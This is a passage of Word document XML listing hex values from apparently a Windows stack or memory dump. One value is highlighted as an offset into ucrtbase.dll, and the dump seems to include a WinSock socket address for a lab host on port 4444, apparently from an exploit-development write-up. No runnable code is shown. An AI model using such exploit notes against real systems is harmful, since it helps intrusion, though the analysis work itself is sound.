                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0036FC4C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FDEE91B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00174778</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55A19284" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000004</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="327EA666" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>4336FE18</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FC265BB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0036FE18</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FC58623" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00121B57</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77B79FF6" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0016ABB0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A80A9DC" w14:textId="4714127A" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>6DFFE76C -&gt; ucrtbase.dll -&gt; Offset: CE76C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="150142C1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>7FFDE000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C6A93D1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FB5B17C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>5C110002</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0866C5EE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69C3F3CE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>FFFFFFFE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D6D1675" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>01016C3C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D033A33" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>FCB70002</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FDCC377" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0B02000A</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53439FB2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6452460E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4356717C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>02020202</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="664C7930" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>536E6957</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1ED209CB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>206B636F</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7ACE850A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00302E32</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FD2B7BC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00160000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31DF7EBD" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>50000063</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="660DF186" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77DA6360</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FF78BDA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77D0304E</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16BD12CC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E86E576" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00160000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="481DD967" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0016AFF0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C2A0FDF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0036FBFC</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34AFB47B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0000001B</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53AB9DB0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00160000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79CD3BF4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="518209BC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>003CDC62</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04BC4226" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>FFFFFFFE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45425EE8" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77DA5BC3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E3FBF7A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77DA58D0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EA172F5" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62C3C6FE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00160000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BB5DBA3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>4000006A</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AB7BC21" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0036FD40</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55B91581" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0036FDC8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="387AD5B3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B64F3B7" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AE69C74" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C0CFA57" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68EC9A2B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00160000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57E35729" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47939D2E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0036FC48</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0501CD06" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000004</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31231474" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0036FE50</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29D4859A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77D6E355</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59162828" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>003CDC62</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="420F5DBF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>FFFFFFFE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="628C52B5" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77DA5BC3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C4DE04A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77DA58D0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12A25E5D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000032</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A0AC357" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09F4CB3B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F255C32" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0036FD8C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="274EA1C3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000008</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EA08724" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000032</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F6D26A0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00161EC8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="596FAAF4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BFE42E2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>01000004</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5458B5B0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
